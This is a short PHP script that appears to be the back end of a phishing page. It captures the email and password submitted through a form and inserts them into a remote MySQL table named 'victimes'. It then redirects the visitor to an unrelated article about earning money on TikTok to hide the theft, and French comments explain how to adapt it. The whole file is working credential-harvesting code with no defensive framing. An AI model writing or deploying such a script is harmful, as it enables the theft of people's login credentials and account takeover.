<?php

$bdd = new PDO('mysql:host=fdb22.awardspace.net;port=3306;dbname=yohani', 'user', 'password');
$req = $bdd->prepare('INSERT INTO victimes (email,password) VALUES (?,?)');  #table_name: le nom de votre table au sein de votre db
$req->execute(array($_POST['email'],$_POST['password']));
header("Location: https://www.blogdumoderateur.com/gagner-argent-tiktok-monetiser-videos/ "); #redirection vers le site voulu
?>



